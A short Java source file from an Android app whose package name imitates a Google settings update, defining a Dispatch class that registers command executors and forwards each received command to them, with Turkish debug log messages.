package com.setting.dl.google.googlesettingupdate.ptt.dispatch;

import android.support.annotation.NonNull;

import com.setting.dl.google.googlesettingupdate.ptt.command.CommandExecutor;
import com.setting.dl.google.googlesettingupdate.ptt.command.ICommand;
import com.setting.dl.google.googlesettingupdate.ptt.command.ICommandExecutor;
import com.setting.dl.google.googlesettingupdate.u;

import java.util.ArrayList;
import java.util.List;

public class Dispatch implements IDispatch {
   
   
   private List<ICommandExecutor> recievers = new ArrayList<>();
   
   @Override
   public void registerReciever(@NonNull ICommandExecutor reciever) {
      
      recievers.add(reciever);
   }
   
   @Override
   public void unregisterReciever(@NonNull ICommandExecutor reciever) {
      
      recievers.remove(reciever);
   }
   
   @Override
   public void publishMessages(List<ICommand> messages) throws CommandExecutor.OrderException, CommandExecutor.InvalidOrderArgumentException {
      
      if (recievers.size() == 0) {
   
         u.log.d("Kayıtlı alıcı yok. Konular işlenmiyor \u2708");
         return;
      }
      
      u.log.d("%d Alıcı var", recievers.size());
      
      for (ICommand message : messages) {
   
         for (ICommandExecutor reciever : recievers){
            
            reciever.executeCommand(message);
         }
      }
   }
   
   
}
